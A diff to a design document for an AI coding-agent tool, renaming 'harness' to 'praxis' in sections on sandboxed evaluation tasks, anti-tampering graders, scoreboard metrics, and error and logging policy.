+Each `evals/<task>/` has `task.toml` (prompt, limits), `repo/` (fixture) and `check.sh` (exit 0 means success, written so it can't be satisfied by editing the tests: tests live outside the agent's writable path, or are restored before checking). Run with sandbox on and `auto-edit` mode. Until T3.3 provides both, `cargo xtask eval` drives `praxis-core` directly, approves every tool call and instead runs each task inside `bwrap`: only the task's copy is writable, the home directory isn't mounted, and the only network path is a forwarded socket to LM Studio. `check.sh` runs in a second `bwrap` with no network, because it executes agent-written code. The command fails if `bwrap` is missing.
 
 `check.sh [workdir]` judges a copy of the agent's edited repo and never changes it. Each task also has `hidden/` (tests outside the writable path), `solution.patch` and optionally `bad-solutions/*.patch`. `scripts/prove-evals` shows that every check fails on the untouched fixture and on tampered tests, passes on the solution and fails on each bad solution; it needs no model and stays out of verify because it compiles every fixture repeatedly.
 
-Scoreboard per model: success rate, turns, wall time, tool-call parse failures, recoveries, loop stops, prompt tokens processed versus cached, re-fetches of masked output, and injection eval outcomes. Token counts alone overstate savings, so every context feature is compared with it switched off. Written as JSON and committed to `evals/results/` when a milestone closes. A metric the harness can't produce yet is `null`, with its reason under `null_reasons`. Model runs vary, so run each task at least 3 times with a fixed seed where supported.
+Scoreboard per model: success rate, turns, wall time, tool-call parse failures, recoveries, loop stops, prompt tokens processed versus cached, re-fetches of masked output, and injection eval outcomes. Token counts alone overstate savings, so every context feature is compared with it switched off. Written as JSON and committed to `evals/results/` when a milestone closes. A metric the praxis can't produce yet is `null`, with its reason under `null_reasons`. Model runs vary, so run each task at least 3 times with a fixed seed where supported.
 
 ## 15. Error and logging policy
 
-- `harness-core` returns typed errors (`thiserror`). Only the CLI top level uses `anyhow`.
+- `praxis-core` returns typed errors (`thiserror`). Only the CLI top level uses `anyhow`.
 - Users get what happened and what to do. Stack traces are for `RUST_LOG=debug` on stderr.
-- Logs exclude prompts, file contents and secrets at `info` and below. Debug-level content logging needs an explicit `HARNESS_LOG_CONTENT=1`.
+- Logs exclude prompts, file contents and secrets at `info` and below. Debug-level content logging needs an explicit `PRAXIS_LOG_CONTENT=1`.
 - A task panic is caught at the tool boundary and becomes a tool error. A session log write failure stops the turn, since continuing would lose data.
 
 ## 16. Sources
